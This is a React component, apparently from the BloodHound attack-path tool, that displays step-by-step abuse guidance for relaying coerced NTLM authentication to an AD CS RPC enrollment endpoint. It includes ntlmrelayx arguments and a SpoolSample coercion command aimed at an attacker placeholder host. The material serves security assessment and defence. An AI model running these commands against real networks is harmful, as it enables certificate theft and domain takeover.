// Copyright 2025 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { Link } from '@mui/material';
import { Typography } from 'doodle-ui';
import { FC } from 'react';
import { EdgeInfoProps } from '../index';

const WindowsAbuse: FC<EdgeInfoProps> = () => {
    return (
        <>
            <Typography variant='body1'>1. Start the Relay Server on Linux</Typography>
            <Typography variant='body2'>
                There is currently no publicly available Windows tool that supports relaying NTLM authentication to an
                AD CS RPC enrollment endpoint. Start the relay server on a Linux host using{' '}
                <Link
                    target='_blank'
                    rel='noopener noreferrer'
                    href='https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py'>
                    ntlmrelayx.py
                </Link>
                . To relay to the enterprise CA via RPC and enroll a certificate, specify the RPC endpoint as the target
                and use the following arguments:
            </Typography>
            <Typography component={'pre'}>
                {'-t rpc://<CA_IP> -rpc-mode ICPR -icpr-ca-name <CA_NAME> -smb2support'}
            </Typography>
            <Typography variant='body1'>2. Coerce the Target Computer</Typography>
            <Typography variant='body2' component='div'>
                Several coercion methods are documented here:{' '}
                <Link
                    target='_blank'
                    rel='noopener noreferrer'
                    href='https://github.com/p0dalirius/windows-coerced-authentication-methods'>
                    Windows Coerced Authentication Methods
                </Link>
                . Examples of tools include:
                <ul style={{ paddingLeft: '1.5em' }}>
                    <li>
                        <Link
                            target='_blank'
                            rel='noopener noreferrer'
                            href='https://github.com/leechristensen/SpoolSample'>
                            SpoolSample
                        </Link>
                    </li>
                    <li>
                        <Link target='_blank' rel='noopener noreferrer' href='https://github.com/topotam/PetitPotam'>
                            PetitPotam
                        </Link>
                    </li>
                </ul>
            </Typography>
            <Typography variant='body2'>
                To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV
                Connection String format: <code>\\SERVER_NETBIOS@PORT/PATH/TO/FILE</code>. Example:
            </Typography>
            <Typography component={'pre'}>{'SpoolSample.exe "VICTIM_IP" "ATTACKER_NETBIOS@PORT/file.txt"'}</Typography>
            <Typography variant='body1'>3. Perform Certificate Authentication</Typography>
            <Typography variant='body2'>
                Authenticate using the certificate obtained as the target principal, for example by using{' '}
                <Link target='_blank' rel='noopener noreferrer' href='https://github.com/GhostPack/Rubeus'>
                    Rubeus
                </Link>
                .
            </Typography>
        </>
    );
};

export default WindowsAbuse;
